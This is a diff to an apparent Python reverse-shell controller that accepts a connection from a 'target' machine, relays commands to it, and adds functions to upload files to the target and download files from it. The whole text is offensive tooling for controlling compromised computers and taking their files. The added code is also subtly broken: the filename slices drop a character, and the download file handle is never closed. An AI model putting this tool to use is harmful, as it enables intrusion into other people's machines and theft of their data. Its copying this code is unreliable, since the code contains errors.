@@ -1,5 +1,6 @@
 import socket
 import json
+import os
 
 
 # Initialize the socket
@@ -14,6 +15,33 @@ sock.listen(5)
 # Accept the next incoming connection
 target, ip = sock.accept()
 print(f'[+] Target connected from: {str(ip)}')
+
+
+# Upload file function will upload file from local host to target computer
+def upload_file(file_name):
+    fh = open(file_name, 'rb')
+    target.send(fh.read())
+
+
+# Download file function will download files from target machine
+def download_file(file_name):
+    # Open a file handle that will write bytes to the local system
+    fh = open(file_name, 'wb')
+    # Set to make sure the program does not get stuck
+    target.settimeout(1)
+    # Receiving packets of data
+    chunk = target.recv(1024)
+    # Run this while loop as long as there is something in chunk
+    while chunk:
+        fh.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    # Remove the timeout when done
+    target.settimeout(None)
+    # Close the file
+    fh.close
 
 
 # Reliable receive function will get data back from the target
@@ -43,6 +71,14 @@ def target_communication():
         reliable_send(command)
         if command == 'quit':
             break
+        elif command[:3] == 'cd ':
+            pass
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:9] == 'download ':
+            download_file(command[10:])
+        elif command[:7] == 'upload ':
+            upload_file(command[8:])
         else:
             result = reliable_recv()
             print(result)
